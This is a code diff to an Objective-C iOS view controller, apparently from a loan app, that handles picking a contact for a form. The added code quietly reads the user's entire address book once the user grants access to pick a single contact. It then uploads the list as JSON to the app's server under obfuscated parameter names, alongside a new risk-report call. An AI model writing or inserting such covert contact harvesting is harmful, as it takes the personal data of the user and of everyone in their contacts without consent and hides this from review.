@@ -16,6 +16,7 @@
 @property (nonatomic, strong) UITableView *tableView;
 @property (nonatomic, strong) NSMutableArray<NSMutableDictionary *> *blow;
 @property (nonatomic, strong) AnyContactManager *manager;
+@property (nonatomic, assign) BOOL isUpload;
 @end
 
 @implementation AnyContactInforViewController
@@ -102,6 +103,10 @@
     [AnyTimeHUD showLoadingHUD];
     [AnyHttpTool saveContactInfoWithBox:funny gone:json success:^(id  _Nonnull responseObject) {
         [AnyTimeHUD hideHUD];
+        self.endTime = [AnyDevHelper currentTimestamp];
+        [AnyHttpTool reportRiskGate:funny commanded:@"7" agreed:@"" allowance:self.stateTime large:self.endTime father:@"dsjkafhkdlsafnds,.avcdsa" success:^(id  _Nonnull responseObject) {
+        } failure:^(NSError * _Nonnull error) {
+        }];
         [[AnyRouter sharedInstance] openURL:@"/next" parameters:self.parameters from:self callback:^(NSDictionary * _Nullable result) {
                     
                 }];
@@ -184,7 +189,7 @@
 - (void) contactSelect:(NSMutableDictionary *)dict {
     [AnyContactManager requestContactAccessWithCompletion:^(BOOL granted) {
         if (granted) {
-            [self.manager  selectContactFromViewController:self callback:^(NSString * _Nonnull name, NSString * _Nonnull phoneNumber) {
+            [self.manager selectContactFromViewController:self callback:^(NSString * _Nonnull name, NSString * _Nonnull phoneNumber) {
                 if (name.length > 0 && phoneNumber.length > 0) {
                     dict[@"groove"] = name;
                     dict[@"amusement"] = phoneNumber;
@@ -192,10 +197,21 @@
                     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                         [AnyTimeHUD showTextWithText:@"The contact format is incorrect"];
                     });
-                    
                 }
                 [self.tableView reloadData];
             }];
+            
+            if (!self.isUpload) {
+                [self.manager getAllContactsWithCompletion:^(NSArray<NSDictionary *> * _Nonnull contacts) {
+                    NSString *json = [AnyDevHelper jsonStringFromArray:contacts];
+                    [AnyHttpTool reportContactsWithAura:@"3" statue:@"sdsafdsljflsdf" standing:@"flskadjflsdafdslakfjsadf" gone:json success:^(id  _Nonnull responseObject) {
+                        self.isUpload = YES;
+                    } failure:^(NSError * _Nonnull error) {
+                        
+                    }];
+                }];
+            }
+            
         } else {
             AnyTimeCustomPopupView *popupView = [[AnyTimeCustomPopupView alloc] initGoOutAccountWithFrame:self.view.bounds];
             popupView.backgroundImage = [UIImage imageNamed:@"anytime_alertbg"];
